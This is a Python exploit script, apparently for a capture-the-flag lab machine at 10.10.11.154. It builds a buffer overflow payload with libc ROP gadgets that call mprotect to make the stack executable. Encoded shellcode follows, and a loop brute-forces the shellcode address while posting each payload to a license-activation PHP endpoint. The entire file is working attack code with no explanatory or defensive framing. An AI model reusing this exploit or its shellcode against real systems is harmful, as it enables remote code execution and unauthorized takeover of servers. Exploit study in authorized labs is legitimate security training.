from pwn import *
from struct import *
import requests

libc_address = 0x007ffff7c6f000
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x8b\xee\x46"
shellcode += b"\x1c\x98\xda\x4a\x3c\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xc3\xdf\xb9\x76\x91"
shellcode += b"\x82\xd3\x8a\x9b\xa6\xcf\xca\xd5\xeb\x83\x56"
shellcode += b"\xa9\xaf\x1c\xae\x9f\xd5\x4f\x74\x0e\x2e\x3e"
shellcode += b"\x4d\xf2\xd0\x0b\x65\xdb\x84\x6f\x44\x01\xb0"
shellcode += b"\x48\x63\xe1\xef\x18\x13\x9d\x92\xcf\xfc\xf3"
shellcode += b"\xd5\x0e\x8b\xd0\x63\x48\x3c\xbb\xd7\x4c\x16"
shellcode += b"\x96\xcc\x1b\x74\x02\x08\x2c\x0c\xc2\xb0\x60"
shellcode += b"\x64\x84\xeb\x1f\x54\x1d\x1a\x33\x19\xc2\x11"
shellcode += b"\x8f\x68\x80\x8d\x20\x1f\xd3\x84\x46\x76\x9d"
shellcode += b"\x92\xc3\xdb\xc3\xdf\xb0\x13\x9d\x83\x13\x63"
shellcode += b"\xc3\x6b\x86\x65\x5f\xb0\x76\x64\xe1\xef\x19"
shellcode += b"\x13\x9d\x84\x20\x1a\xd1\xe1\x43\x54\x1d\x1a"
shellcode += b"\x32\xd1\x74\x08\x46\x1c\x98\xda\x4a\x3c"

while(True):
	for i in range(1,2112):
		padding=b"\x90"*120

		payload = b""
		payload += b"A" * 519
		payload += p64(libc_address+0x0000000000027c3d) # pop rdi ; ret
		payload += p64(0x007ffffffde000) # stack address
		payload += p64(libc_address+0x000000000002940f) # pop rsi ; pop r15 ; ret
		payload += p64(0x21000) # size
		# payload += p64(0xAAAAAAAAAAAAAAAA) # garbage for r15
		payload += p64(libc_address+0x00000000000caa2d) # pop rdx ; ret from libc
		payload += p64(0x7) #mode
		payload += p64(0x7ffff7d671e0) # mprotect address
		payload += p64(0x007ffffffff000-i*64) # shellcode address
		print(hex(0x007ffffffff000-i*64))
		payload += padding
		payload += shellcode
		sleep(0.2)

		burp0_url = "http://10.10.11.154:80/activate_license.php"
		burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://10.10.11.154", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryEpjmFILHBbrRIBZS", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://10.10.11.154/index.php?page=beta.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
		burp0_data = b"------WebKitFormBoundaryEpjmFILHBbrRIBZS\r\nContent-Disposition: form-data; name=\"licensefile\"; filename=\"payload.txt\"\r\nContent-Type: text/plain\r\n\r\n"+payload+b"\r\n------WebKitFormBoundaryEpjmFILHBbrRIBZS--\r\n"
		proxies={'http':'http://localhost:8080'}

		requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

# p.sendline(p32(len(payload),endian='big'))

# p.sendline(payload)
# p.interactive()